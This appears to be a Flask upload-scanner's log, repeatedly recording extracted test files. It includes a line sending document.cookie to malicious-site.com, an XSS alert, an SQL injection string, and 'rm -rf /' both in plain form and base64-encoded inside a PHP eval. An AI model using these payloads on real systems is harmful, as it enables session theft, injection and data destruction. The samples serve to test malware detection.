2025-02-22 20:56:15,056 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,057 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:56:15,059 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:56:15,062 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:56:15,065 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:56:15,067 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,068 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,070 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,071 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:56:15,074 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,075 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,077 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:56:15,079 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:56:15,080 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:56:15,081 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:56:15,082 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,083 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,085 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,086 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:56:15,088 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,090 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,091 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:56:15,093 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:56:15,094 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:56:15,095 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:56:15,096 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,097 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,098 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,100 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:56:15,102 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,103 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,104 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:56:15,106 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:56:15,107 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:56:15,109 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:56:15,111 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,112 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,114 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,115 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:56:15,119 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,121 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:56:15,122 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,124 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,125 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,127 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,129 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,130 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,133 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,134 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,136 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,137 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,138 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,140 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,141 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,142 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,143 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,145 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,146 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,147 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,149 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,150 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,151 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,152 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,154 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,155 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,156 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:56:15,156 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 20:56:15,156 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:56:15,158 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:56:15,158 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 20:56:15,158 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:56:15,159 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:56:15,159 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 20:56:15,159 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:56:15,161 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:56:15,162 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:56:15,164 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:56:15,166 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:56:15,167 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,169 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:56:15,174 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:56:15,175 - [33mPress CTRL+C to quit[0m
2025-02-22 20:56:19,766 - 127.0.0.1 - - [22/Feb/2025 20:56:19] "GET / HTTP/1.1" 200 -
2025-02-22 20:56:25,920 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 208, in upload_file
    scan_zip_file(filepath)  # Scan the ZIP file
  File "app.py", line 243, in scan_zip_file
    os.rmdir(extract_path)
OSError: [Errno 39] Directory not empty: 'temp_extracted/flask_file_upload_2'
2025-02-22 20:56:25,921 - 127.0.0.1 - - [22/Feb/2025 20:56:25] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 20:56:33,211 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 208, in upload_file
    scan_zip_file(filepath)  # Scan the ZIP file
  File "app.py", line 243, in scan_zip_file
    os.rmdir(extract_path)
OSError: [Errno 39] Directory not empty: 'temp_extracted/test'
2025-02-22 20:56:33,212 - 127.0.0.1 - - [22/Feb/2025 20:56:33] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 20:58:09,244 - Extracted content from uploads/flask_file_upload_2.zip: PK     șVZ               flask_file_upload/UT
 ԹgԹgԹgux     PK   VZ        /  *   flask_file_upload/create_malicious_xlsx.pyUT
 qԹgԹgԹgux     }RJ0}W\CZA|P0]Ň
e|YzaiRtI[MyJ=prɵ*@(]#ޔެA90⪠3*ji6 w.ࡅ{ƇJ~hen|"j^'YžXnF8 SjiTLI#ʫۖ?2p	9TtwI'4+$wh._ur?椉[*"b>XdeHNǠ?W̰PVjgiWڎz;s2jYILXTQRjm95<m
*TIV:
Ӽt2	#XS7'Z-DOVKͥ#1 xQd+!vIQ<3,û8PK  /  PK   VZ        '  &   flask_file_upload/metadata_analysis.pyUT
 z¹g¹gz¹gux     UQO0~ϯ8
2025-02-22 20:58:09,989 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 20:58:09,991 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:58:09,992 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:58:09,994 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:58:09,995 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:58:09,996 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:58:09,998 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:58:09,999 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

